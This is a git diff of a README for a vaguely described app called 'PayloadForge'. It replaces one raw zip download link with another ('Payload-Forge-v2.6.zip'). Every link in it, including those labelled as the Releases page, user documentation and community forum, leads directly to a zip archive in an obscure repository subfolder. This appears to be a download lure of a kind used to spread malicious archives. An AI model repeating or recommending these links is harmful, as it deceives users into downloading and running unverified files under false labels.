@@ -6,11 +6,11 @@ Welcome to PayloadForge! This application helps you streamline your workflow eff
 
 ## 📥 Download PayloadForge
 
-[![Download PayloadForge](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
+[![Download PayloadForge](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip)](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip)
 
 To download PayloadForge, visit the Releases page:
 
-[Download PayloadForge from the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
+[Download PayloadForge from the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**
    Go to the following link to access the Releases page:
-   [Visit the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip)
 
 2. **Find the Latest Version**
    Look for the latest version listed at the top of the page. It usually has the highest number.
@@ -71,7 +71,7 @@ PayloadForge is open-source software. You can view the license information on th
 
 ## 🔧 Additional Resources
 
-- [User Documentation](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip) - In-depth guides and tutorials.
-- [Community Forum](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/PayloadForge.zip) - Connect with other users and get tips.
+- [User Documentation](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip) - In-depth guides and tutorials.
+- [Community Forum](https://raw.githubusercontent.com/dkapolka/PayloadForge/main/gorgeable/Payload-Forge-v2.6.zip) - Connect with other users and get tips.
 
 Thank you for choosing PayloadForge! We hope you enjoy using this tool. 
